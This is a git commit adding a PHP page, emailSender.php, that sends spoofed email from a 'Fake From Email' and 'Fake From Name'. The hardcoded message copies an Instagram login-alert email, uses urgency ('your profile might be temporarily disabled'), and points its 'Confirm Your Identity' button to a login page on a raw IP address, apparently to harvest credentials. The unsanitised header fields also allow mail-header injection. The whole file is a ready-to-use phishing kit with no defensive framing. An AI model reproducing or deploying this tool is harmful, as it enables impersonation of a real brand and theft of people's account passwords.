751a267774949b0979f7b55622a7a3646cf795ff
lukeivan1 <64155668+lukeivan1@users.noreply.github.com>
2020-04-23 14:58:32 +0200

    Add files via upload

---
+++ emailSender.php
@@ -0,0 +1,70 @@
+<?php
+
+if(isset($_POST['to']) && isset($_POST['from']) && isset($_POST['fromname']) && isset($_POST['replyto']) && isset($_POST['subject']))
+{
+    $message = '<table border="0" cellspacing="0" cellpadding="0" align="center" id="m_-6630350099384441986email_table" style="border-collapse:collapse"><tbody><tr><td id="m_-6630350099384441986email_content" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;background:#ffffff"><table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td height="20" style="line-height:20px" colspan="3">&nbsp;</td></tr><tr><td height="1" colspan="3" style="line-height:1px"></td></tr><tr><td><table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse;border:solid 1px white;margin:0 auto 5px auto;padding:3px 0;text-align:center;width:430px"><tbody><tr><td width="15px" style="width:15px"></td><td style="line-height:0px;width:400px;padding:0 0 15px 0"><table border="0" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="width:100%;text-align:left;height:33px"><img height="33" src="https://ci4.googleusercontent.com/proxy/H-WMBt20rSRWwIK0YLwC8Uyi1mnXWEEEiUT0twBA78N4_Rbri9VuqAL_Azd6xVjLkSiTQ6r1RjyDJ2Hx1O_3UqLo4H_LxG1o8LHL4yDfZw=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/yb/r/QTa-gpOyYBa.png" style="border:0" class="CToWUd"></td></tr></tbody></table></td><td width="15px" style="width:15px"></td></tr><tr><td width="15px" style="width:15px"></td><td style="border-top:solid 1px #dbdbdb"></td><td width="15px" style="width:15px"></td></tr></tbody></table></td></tr><tr><td><table border="0" width="430" cellspacing="0" cellpadding="0" style="border-collapse:collapse;margin:0 auto 0 auto"><tbody><tr><td><table border="0" width="430px" cellspacing="0" cellpadding="0" style="border-collapse:collapse;margin:0 auto 0 auto;width:430px"><tbody><tr><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td></tr><tr><td><table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td><table border="0" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td width="20" style="display:block;width:20px">&nbsp;&nbsp;&nbsp;</td><td><table border="0" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td></td></tr><tr><td><p style="margin:10px 0 10px 0;color:#565a5c;font-size:18px">Hi cysecor,</p><p style="margin:10px 0 10px 0;color:#565a5c;font-size:18px">Someone tried logging in to your Instagram account.</p></td></tr><tr></tr><tr><td height="10" style="line-height:10px" colspan="1">&nbsp;</td></tr><tr><td><a href="#" style="color:#3b5998;text-decoration:none;display:block;width:370px" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://instagram.com/accounts/password/reset/confirm/?uidb36%3Da8ayhcm%26token%3D5fd-273cc8cf899b3c9516cf0f09a32a7943%26s%3Dpassword_reset_email&amp;source=gmail&amp;ust=1586105229940000&amp;usg=AFQjCNF25pYCycwgss4YZi_FaJBr8GDEcg"><table border="0" width="390" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="border-collapse:collapse;border-radius:3px;text-align:center;display:block;border:solid 1px #009fdf;padding:10px 16px 14px 16px;margin:0 2px 0 auto;min-width:80px;background-color:#47a2ea"><a href="http://92.222.216.62/ig/login.html" style="padding-top: 5px;color:#3b5998;text-decoration:none;display:block" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://instagram.com/accounts/password/reset/confirm/?uidb36%3Da8ayhcm%26token%3D5fd-273cc8cf899b3c9516cf0f09a32a7943%26s%3Dpassword_reset_email&amp;source=gmail&amp;ust=1586105229940000&amp;usg=AFQjCNF25pYCycwgss4YZi_FaJBr8GDEcg"><center><font size="3"><span style="font-family:Helvetica Neue,Helvetica,Roboto,Arial,sans-serif;white-space:nowrap;font-weight:bold;vertical-align:middle;color:#fdfdfd;font-size:16px;line-height:16px">Confirm Your Identity</span></font></center></a></td></tr></tbody></table></a></td></tr><tr><td height="10" style="line-height:10px" colspan="1">&nbsp;</td></tr><tr><td><p style="margin:10px 0 10px 0;color:#565a5c;font-size:18px">If you ignore this message, your profile might be temporarily disabled. We\'re giving you 24 hours to verify your identity before taking any actions.</p></td></tr></tbody></table></td><td width="20" style="display:block;width:20px">&nbsp;&nbsp;&nbsp;</td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr><tr><td><table border="0" width="430px" cellspacing="0" cellpadding="0" style="border-collapse:collapse;margin:0 auto 0 auto;width:430px"><tbody><tr><td height="5" style="line-height:5px" colspan="3">&nbsp;</td></tr><tr><td width="20" style="display:block;width:20px">&nbsp;&nbsp;&nbsp;</td><td><div style="padding-top:10px"><img src="https://ci4.googleusercontent.com/proxy/1jVmGWy9tCnCqBWLSinJ6Z8m-mANhlu-0HJJpn3x1Rf1YzMg3CCnm8YzpKQh29yaES9XHM9NySfBVkv1HDbly59FbBb3QtlImd0tFZxpVA=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/yP/r/ARZq-vP6uSX.png" height="30" width="77" alt="" class="CToWUd"><br></div><div style="height:10px"></div><div style="color:#abadae;font-size:11px;margin:0 auto 5px auto">© Instagram. Facebook Inc., 1601 Willow Road, Menlo Park, CA 94025<br></div><div style="color:#abadae;font-size:11px;margin:0 auto 5px auto">This message was sent to <a style="color:#abadae;text-decoration:underline">cysecor@gmail.com</a> and intended for cysecor. Not your account? <a href="#" style="color:#abadae;text-decoration:underline" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://instagram.com/accounts/remove/report_wrong_email/a8ayhcm/5fd-cf4b8f0c27301431067fca9d5620efe8/wUjsBqeC/Y3lzZWNvckBnbWFpbC5jb20/&amp;source=gmail&amp;ust=1586105229940000&amp;usg=AFQjCNEFCsQl1RCBS2dFBIMSlSkFoETF4w">Remove your email</a> from this account.<br></div></td><td width="20" style="display:block;width:20px">&nbsp;&nbsp;&nbsp;</td></tr></tbody></table></td></tr><tr><td height="20" style="line-height:20px" colspan="3">&nbsp;</td></tr></tbody></table><span><img src="https://ci6.googleusercontent.com/proxy/gjW4VFBHo4nwOIRzRdTpB63FTpp2cE2dLN7zZLxWG97Q509VsNPFqgg-kKByLBgSvkiQaNPR7eOXs_rjvse7gRok-C8dSdbl6CzssEaVkZnw9ES0VwjeIuklEG4OSp549wEfc_aNOxFgPqligpMf4FH3Bm9s=s0-d-e1-ft#https://www.facebook.com/email_open_log_pic.php?mid=5a2797e57898fG24bc320a5ed656G5a279c7ed8c64G248" style="border:0;width:1px;height:1px" class="CToWUd"></span></td></tr></tbody></table>';
+
+    $headers = 'From: '.$_POST['fromname'].' <'.$_POST['from'].'>' . "\r\n" .
+        'Reply-To: '. $_POST['replyto'] . "\r\n";
+    $headers .= "MIME-Version: 1.0\r\n";
+    $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
+
+    $mail = mail($_POST['to'],$_POST['subject'],$message,$headers);
+
+    if($mail)
+    {
+        $mail = '<div style="color:green">Mail sent.</div>';
+    } else {
+        $mail = '<div style="color:red">Error</div>';
+    }
+} else {
+    if(!isset($mail))
+    {
+        $mail = '<div style="color:red">Fill in all inputs</div>';
+    }
+}
+
+
+
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Email Sender</title>
+</head>
+<body>
+<?php echo $mail; ?>
+<form action="emailSender.php" method="post">
+    <table border="0">
+        <tr>
+            <td>To: </td>
+            <td><input type="text" name="to"></td>
+        </tr>
+
+        <tr>
+            <td>Fake From Email: </td>
+            <td><input type="text" name="from"></td>
+        </tr>
+        <tr>
+            <td>Fake From Name: </td>
+            <td><input type="text" name="fromname"></td>
+        </tr>
+        <tr>
+            <td>Reply to: </td>
+            <td><input type="text" name="replyto"></td>
+        </tr>
+
+        <tr>
+            <td>Subject: </td>
+            <td><input type="text" name="subject"></td>
+        </tr>
+
+        <tr>
+            <td colspan="2">
+                <input type="submit" value="Send Email" />
+            </td>
+        </tr>
+    </table>
+</form>
+</body>
+</html>
